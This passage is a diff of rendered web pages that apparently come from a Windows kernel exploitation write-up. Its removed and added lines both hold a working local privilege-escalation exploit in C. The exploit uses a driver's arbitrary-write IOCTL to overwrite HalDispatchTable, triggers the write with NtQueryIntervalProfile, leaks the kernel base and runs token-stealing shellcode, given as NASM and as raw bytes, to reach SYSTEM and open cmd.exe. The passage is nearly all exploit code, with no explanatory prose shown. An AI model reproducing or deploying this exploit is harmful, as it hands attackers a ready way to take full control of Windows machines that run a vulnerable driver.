-    <span class="n">hDevice</span> <span class="o">=</span> <span class="n">CreateFile</span><span class="p">(</span><span class="n">DEVICE_NAME</span><span class="p">,</span> <span class="n">GENERIC_WRITE</span> <span class="o">|</span> <span class="n">GENERIC_READ</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">OPEN_EXISTING</span><span class="p">,</span> <span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
-    <span class="k">if</span><span class="p">(</span><span class="n">hDevice</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span>
-    <span class="p">{</span>
-        <span class="n">printf</span><span class="p">(</span><span class="s">"[-] Error with Createfile : %.8x.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">GetLastError</span><span class="p">());</span>
-        <span class="k">return</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
-    <span class="p">}</span>
-
-    <span class="n">l33t</span><span class="p">.</span><span class="n">where</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD64</span><span class="p">)</span> <span class="n">HalDispatchTable</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PVOID</span><span class="p">);</span>
-    <span class="n">l33t</span><span class="p">.</span><span class="n">what</span> <span class="o">=</span> <span class="n">leetAddress</span><span class="p">;</span>
-    <span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span> <span class="n">IOCTL_WRIT</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">l33t</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">l33t</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">byte</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
-
-    <span class="n">NtQueryIntervalProfile</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">GetModuleHandle</span><span class="p">(</span><span class="s">"ntdll.dll"</span><span class="p">),</span> <span class="s">"NtQueryIntervalProfile"</span><span class="p">);</span>
-        <span class="k">if</span> <span class="p">(</span><span class="n">NtQueryIntervalProfile</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
-    	<span class="n">printf</span><span class="p">(</span><span class="s">"[-] Can't find NtQueryIntervalProfile</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
-    	<span class="k">return</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
-    <span class="p">}</span>
-
-    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Execute NtQueryIntervalProfile</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
-    <span class="n">NtQueryIntervalProfile</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">wtf</span><span class="p">);</span>
-
-    <span class="n">GetUserNameA</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sizeofUsername</span><span class="p">);</span>
-    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] New username: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">username</span><span class="p">);</span>
-
-    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Modify HalDispatchTable+0x8 to point on KeGetCurrentThread</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
-    <span class="n">KeGetCurrentThread</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">ntoskrnl</span><span class="p">,</span> <span class="s">"KeGetCurrentThread"</span><span class="p">);</span>
-    <span class="k">if</span> <span class="p">(</span><span class="n">KeGetCurrentThread</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
-        <span class="n">printf</span><span class="p">(</span><span class="s">"[-] Can't found KeGetCurrentThread in ntoskrnl.exe</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
-        <span class="k">return</span> <span class="n">EXIT_FAILURE</span><span class="p">;</span>
-    <span class="p">}</span>
-
-    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] KeGetCurrentThread in userland: 0x%X</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">KeGetCurrentThread</span><span class="p">);</span>
-    <span class="n">KeGetCurrentThread</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD64</span><span class="p">)</span> <span class="n">KeGetCurrentThread</span> <span class="o">-</span> <span class="p">(</span><span class="n">DWORD64</span><span class="p">)</span> <span class="n">ntoskrnl</span> <span class="o">+</span> <span class="p">(</span><span class="n">DWORD64</span><span class="p">)</span> <span class="n">kernelBase</span><span class="p">;</span>
-    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] KeGetCurrentThread in kernelland: 0x%X</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">KeGetCurrentThread</span><span class="p">);</span>
-
-    <span class="n">l33t</span><span class="p">.</span><span class="n">where</span> <span class="o">=</span> <span class="p">(</span><span class="n">DWORD64</span><span class="p">)</span> <span class="n">HalDispatchTable</span> <span class="o">+</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">PVOID</span><span class="p">);</span>
-    <span class="n">l33t</span><span class="p">.</span><span class="n">what</span> <span class="o">=</span> <span class="n">KeGetCurrentThread</span><span class="p">;</span>
-    <span class="n">DeviceIoControl</span><span class="p">(</span><span class="n">hDevice</span><span class="p">,</span> <span class="n">IOCTL_WRIT</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">l33t</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">l33t</span><span class="p">),</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">byte</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
-    <span class="n">CloseHandle</span><span class="p">(</span><span class="n">hDevice</span><span class="p">);</span>
-
-    <span class="n">printf</span><span class="p">(</span><span class="s">"[+] Executing a new command console to test it...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
-    <span class="n">si</span><span class="p">.</span><span class="n">cb</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">si</span><span class="p">);</span> 
-    <span class="n">CreateProcess</span><span class="p">(</span><span class="nb">NULL</span><span class="p">,</span> <span class="s">"cmd.exe"</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">TRUE</span><span class="p">,</span> <span class="n">CREATE_NEW_CONSOLE</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">si</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pi</span><span class="p">);</span>
-
-    <span class="k">return</span> <span class="n">EXIT_SUCCESS</span><span class="p">;</span>
-<span class="p">}</span>
-</code></pre></div></div>
-
-<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">format</span> <span class="nv">PE64</span> <span class="nv">GUI</span> <span class="mf">4.0</span>
-
-<span class="nl">start:</span>
-
-<span class="c1">; We save the registers</span>
-<span class="nf">push</span> <span class="nb">rbx</span>
-<span class="nf">push</span> <span class="nb">rcx</span>
-<span class="nf">push</span> <span class="nb">rdx</span>
-<span class="nf">push</span> <span class="nb">rdi</span>
-<span class="nf">push</span> <span class="nb">rsi</span>
-
-<span class="c1">;--------------------------------</span>
-<span class="c1">; 			Stack</span>
-<span class="c1">;--------------------------------</span>
-<span class="c1">; RSP-8: EPROCESS+0x188 system</span>
-<span class="c1">;--------------------------------</span>
-<span class="c1">; RSP-4: EPROCESS+0x188 exploit</span>
-<span class="c1">;--------------------------------</span>
-<span class="nf">push</span> <span class="mh">0xFFFFFFFFFFFFFFFF</span>
-<span class="nf">push</span> <span class="mh">0xFFFFFFFFFFFFFFFF</span>
-
-<span class="nf">mov</span> <span class="nb">rdx</span><span class="p">,</span> <span class="p">[</span><span class="nb">gs</span><span class="p">:</span><span class="kt">qword</span> <span class="mh">0x188</span><span class="p">]</span>   <span class="c1">; +0x180 PrcbData : _KPRCB | +0x008 CurrentThread : _KTHREAD			</span>
-<span class="nf">mov</span> <span class="nb">rdx</span><span class="p">,</span> <span class="p">[</span><span class="nb">rdx</span> <span class="o">+</span> <span class="mh">0x70</span><span class="p">]</span>       <span class="c1">; +0x050 ApcState : _KAPC_STATE | +0x020 Process : _KPROCESS</span>
-<span class="nf">add</span> <span class="nb">rdx</span><span class="p">,</span> <span class="mh">0x188</span>              <span class="c1">; +0x188 ActiveProcessLinks : _LIST_ENTRY</span>
-<span class="nf">mov</span> <span class="nb">rbx</span><span class="p">,</span> <span class="nb">rdx</span>                <span class="c1">; Our linked list \o/ We save the first structure</span>
-
-<span class="nl">searchProcess:</span>
-<span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="p">[</span><span class="nb">rdx</span> <span class="o">-</span> <span class="mh">0x8</span><span class="p">]</span>        <span class="c1">; +0x180 UniqueProcessId</span>
-<span class="nf">cmp</span> <span class="nb">rax</span><span class="p">,</span> <span class="mh">0x4</span>                <span class="c1">; SYSTEM PID</span>
-<span class="nf">je</span> <span class="nv">sysProcFound</span>
-<span class="nf">mov</span> <span class="nb">rcx</span><span class="p">,</span> <span class="mh">0x4141414141414141</span> <span class="c1">; Our exploit PID</span>
-<span class="nf">cmp</span> <span class="nb">rax</span><span class="p">,</span> <span class="nb">rcx</span>                <span class="c1">; cmp reg64, imm64 don't exist</span>
-<span class="nf">je</span> <span class="nv">exploitProcFound</span>
- 
-<span class="nl">nextProcess:</span>
-<span class="nf">mov</span> <span class="nb">rdx</span><span class="p">,</span> <span class="p">[</span><span class="nb">rdx</span><span class="p">]</span>              <span class="c1">; Next process (Flink)</span>
-<span class="nf">cmp</span> <span class="nb">rdx</span><span class="p">,</span> <span class="nb">rbx</span>                <span class="c1">; We are back at the starting point</span>
-<span class="nf">je</span> <span class="nv">retApp</span>
-<span class="nf">jmp</span> <span class="nv">searchProcess</span>           <span class="c1">; We loop!</span>
- 
-<span class="nl">sysProcFound:</span>
-<span class="nf">mov</span> <span class="p">[</span><span class="nb">rsp</span><span class="o">+</span><span class="mi">8</span><span class="p">],</span> <span class="nb">rdx</span>
-<span class="nf">jmp</span> <span class="nb">al</span><span class="nv">lPIDFound</span>
- 
-<span class="nl">exploitProcFound:</span>
-<span class="nf">mov</span> <span class="p">[</span><span class="nb">rsp</span><span class="p">],</span> <span class="nb">rdx</span>
- 
-<span class="nl">allPIDFound:</span>
-<span class="nf">mov</span> <span class="nb">rcx</span><span class="p">,</span> <span class="mh">0xFFFFFFFFFFFFFFFF</span>
-<span class="nf">cmp</span> <span class="p">[</span><span class="nb">rsp</span><span class="p">],</span> <span class="nb">rcx</span>
-<span class="nf">je</span> <span class="nv">nextProcess</span>
-<span class="nf">cmp</span> <span class="p">[</span><span class="nb">rsp</span><span class="o">+</span><span class="mi">8</span><span class="p">],</span> <span class="nb">rcx</span>
-<span class="nf">je</span> <span class="nv">nextProcess</span>
-
-<span class="c1">; We copy the SYSTEM token</span>
-<span class="nf">pop</span> <span class="nb">rdi</span> <span class="c1">; Exploit</span>
-<span class="nf">pop</span> <span class="nb">rsi</span> <span class="c1">; System</span>
-<span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="p">[</span><span class="nb">rsi</span> <span class="o">+</span> <span class="mh">0x80</span><span class="p">]</span>       <span class="c1">; 0x208 - 0x188 = 0x80 | +0x208 Token : _EX_FAST_REF</span>
-<span class="nf">mov</span> <span class="p">[</span><span class="nb">rdi</span> <span class="o">+</span> <span class="mh">0x80</span><span class="p">],</span> <span class="nb">rax</span>
- 
-<span class="nl">retApp:</span>
-<span class="c1">; Restore the registers</span>
-<span class="nf">pop</span> <span class="nb">rsi</span>
-<span class="nf">pop</span> <span class="nb">rdi</span>
-<span class="nf">pop</span> <span class="nb">rdx</span>
-<span class="nf">pop</span> <span class="nb">rcx</span>
-<span class="nf">pop</span> <span class="nb">rbx</span>
-<span class="nf">ret</span>
-</code></pre></div></div>
-
-        </div>
-      </div>
-    </div>
+</code></pre><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;winioctl.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="cp">#define IOCTL_WRIT CTL_CODE(FILE_DEVICE_UNKNOWN, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define DEVICE_NAME &#34;\\\\.\\3&#34;
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">enum</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="n">SystemBasicInformation</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">	<span class="n">SystemProcessorInformation</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">	<span class="n">SystemPerformanceInformation</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">	<span class="n">SystemTimeOfDayInformation</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">	<span class="n">SystemPathInformation</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">	<span class="n">SystemProcessInformation</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">	<span class="n">SystemCallCountInformation</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">	<span class="n">SystemDeviceInformation</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">	<span class="n">SystemProcessorPerformanceInformation</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">	<span class="n">SystemFlagsInformation</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">	<span class="n">SystemCallTimeInformation</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">	<span class="n">SystemModuleInformation</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">SYSTEM_INFORMATION_CLASS</span><span class="p">,</span> <span class="o">*</span><span class="n">PSYSTEM_INFORMATION_CLASS</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PVOID</span> <span class="n">Reserved1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PVOID</span> <span class="n">Reserved2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PVOID</span> <span class="n">ImageBaseAddress</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ULONG</span> <span class="n">ImageSize</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ULONG</span> <span class="n">Flags</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">WORD</span> <span class="n">Id</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">WORD</span> <span class="n">Rank</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">WORD</span> <span class="n">w018</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">WORD</span> <span class="n">NameOffset</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">BYTE</span> <span class="n">Name</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">SYSTEM_MODULE</span><span class="p">,</span> <span class="o">*</span><span class="n">PSYSTEM_MODULE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ULONG</span> <span class="n">ModulesCount</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">SYSTEM_MODULE</span> <span class="n">Modules</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">SYSTEM_MODULE_INFORMATION</span><span class="p">,</span> <span class="o">*</span><span class="n">PSYSTEM_MODULE_INFORMATION</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="nf">DWORD</span> <span class="p">(</span><span class="n">WINAPI</span><span class="o">*</span> <span class="n">_NtQuerySystemInformation</span><span class="p">)(</span><span class="n">SYSTEM_INFORMATION_CLASS</span><span class="p">,</span> <span class="n">PVOID</span><span class="p">,</span> <span class="n">ULONG</span><span class="p">,</span> <span class="n">PULONG</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="nf">DWORD</span> <span class="p">(</span><span class="n">WINAPI</span><span class="o">*</span> <span class="n">_NtAllocateVirtualMemory</span><span class="p">)(</span><span class="n">HANDLE</span><span class="p">,</span> <span class="n">PVOID</span><span class="o">*</span><span class="p">,</span> <span class="n">ULONG_PTR</span><span class="p">,</span> <span class="n">PSIZE_T</span><span class="p">,</span> <span class="n">ULONG</span><span class="p">,</span> <span class="n">ULONG</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="nf">DWORD</span> <span class="p">(</span><span class="n">WINAPI</span><span class="o">*</span> <span class="n">_NtQueryIntervalProfile</span><span class="p">)(</span><span class="n">DWORD</span><span class="p">,</span> <span class="n">PULONG</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PDWORD64</span> <span class="n">where</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">DWORD64</span> <span class="n">what</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="n">L33TNESS</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl"><span class="o">*</span><span class="n">PL33TNESS</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">BYTE</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span>  <span class="s">&#34;</span><span class="se">\x53\x51\x52\x57\x56\x6A\xFF\x6A\xFF\x65\x48\x8B\x14\x25\x88\x01\x00\x00\x48\x8B\x52\x70\x48\x81\xC2\x88\x01</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">                    <span class="s">&#34;</span><span class="se">\x00\x00\x48\x89\xD3\x48\x8B\x42\xF8\x48\x83\xF8\x04\x74\x19\x48\xB9\x41\x41\x41\x41\x41\x41\x41\x41\x48\x39</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">                    <span class="s">&#34;</span><span class="se">\xC8\x74\x11\x48\x8B\x12\x48\x39\xDA\x74\x31\xEB\xDD\x48\x89\x54\x24\x08\xEB\x04\x48\x89\x14\x24\x48\xC7\xC1</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">                    <span class="s">&#34;</span><span class="se">\xFF\xFF\xFF\xFF\x48\x39\x0C\x24\x74\xDE\x48\x39\x4C\x24\x08\x74\xD7\x5F\x5E\x48\x8B\x86\x80\x00\x00\x00\x48</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">                    <span class="s">&#34;</span><span class="se">\x89\x87\x80\x00\x00\x00\x5E\x5F\x5A\x59\x5B\xC3</span><span class="s">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">replacePattern</span><span class="p">(</span><span class="kt">char</span> <span class="n">buffer</span><span class="p">[],</span> <span class="kt">int</span> <span class="n">bufferSize</span><span class="p">,</span> <span class="n">DWORD64</span> <span class="n">pattern</span><span class="p">,</span> <span class="n">DWORD64</span> <span class="n">value</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">BOOL</span> <span class="n">found</span> <span class="o">=</span> <span class="n">FALSE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">         
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">bufferSize</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">*</span><span class="p">(</span><span class="n">PDWORD64</span><span class="p">)(</span><span class="n">buffer</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> <span class="o">==</span> <span class="n">pattern</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">found</span> <span class="o">=</span> <span class="n">TRUE</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="o">*</span><span class="p">(</span><span class="n">PDWORD64</span><span class="p">)(</span><span class="n">buffer</span> <span class="o">+</span> <span class="n">i</span><span class="p">)</span> <span class="o">=</span> <span class="n">value</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">         
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">found</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>                    
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">PVOID</span> <span class="nf">getKernelBase</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="n">PVOID</span> <span class="n">ntdll</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">_NtQuerySystemInformation</span> <span class="n">NtQuerySystemInformation</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">DWORD</span> <span class="n">sizeInfo</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">DWORD</span> <span class="n">error</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">PSYSTEM_MODULE_INFORMATION</span> <span class="n">moduleList</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">PVOID</span> <span class="n">kernelBase</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">ntdll</span> <span class="o">=</span> <span class="n">GetModuleHandle</span><span class="p">(</span><span class="s">&#34;ntdll.dll&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">ntdll</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;[-] Can&#39;t found ntdll&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    	<span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">NtQuerySystemInformation</span> <span class="o">=</span> <span class="n">GetProcAddress</span><span class="p">(</span><span class="n">ntdll</span><span class="p">,</span> <span class="s">&#34;NtQuerySystemInformation&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">NtQuerySystemInformation</span><span class="p">(</span><span class="n">SystemModuleInformation</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">sizeInfo</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">sizeInfo</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;[-] NtQuerySystemInformation return 0 for information size</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    	<span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">moduleList</span> <span class="o">=</span> <span class="p">(</span><span class="n">PSYSTEM_MODULE_INFORMATION</span><span class="p">)</span> <span class="n">malloc</span><span class="p">(</span><span class="n">sizeInfo</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">error</span> <span class="o">=</span> <span class="n">NtQuerySystemInformation</span><span class="p">(</span><span class="n">SystemModuleInformation</span><span class="p">,</span> <span class="n">moduleList</span><span class="p">,</span> <span class="n">sizeInfo</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">error</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;[-] NtQuerySystemInformation error: 0x%X (struct size: 0x%X)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">error</span><span class="p">,</span> <span class="n">sizeInfo</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    	<span class="n">free</span><span class="p">(</span><span class="n">moduleList</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    	<span class="k">return</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">kernelBase</span> <span class="o">=</span> <span class="n">moduleList</span><span class="o">-&gt;</span><span class="n">Modules</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">ImageBaseAddress</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">free</span><span class="p">(</span><span class="n">moduleList</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">kernelBase</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">HANDLE</span> <span class="n">hDevice</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">L33TNESS</span> <span class="n">l33t</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
+</span></span><span class="line"><span class="cl">    <span class="n">DWORD</span> <span class="n">byte</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PVOID</span> <span class="n">ntoskrnl</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PVOID</span> <span class="n">HalDispatchTable</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PVOID</span> <span class="n">originalValue</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PVOID</span> <span class="n">kernelBase</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">DWORD</span> <span class="n">error</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PVOID</span> <span class="n">leetAddress</span> <span class="o">=</span> <span class="mh">0x1337</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">DWORD</span> <span class="n">sizeofShellcode</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">shellcode</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">_NtAllocateVirtualMemory</span> <span class="n">NtAllocateVirtualMemory</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
